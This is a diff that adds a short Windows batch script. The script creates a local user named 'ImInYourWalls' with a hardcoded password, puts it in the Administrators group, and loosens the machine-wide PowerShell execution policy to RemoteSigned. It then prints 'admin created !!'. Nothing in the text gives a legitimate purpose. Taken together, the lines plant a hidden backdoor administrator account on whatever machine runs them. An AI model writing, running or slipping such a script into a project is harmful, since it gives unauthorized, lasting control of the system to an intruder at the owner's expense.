@@ -1,0 +1,5 @@
+@echo off
+net user ImInYourWalls unclesamneedsu /add
+powershell -c "Add-LocalGroupMember -Group 'Administrators' -Member 'ImInYourWalls'"
+powershell -c "Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope LocalMachine"
+@echo admin created !!
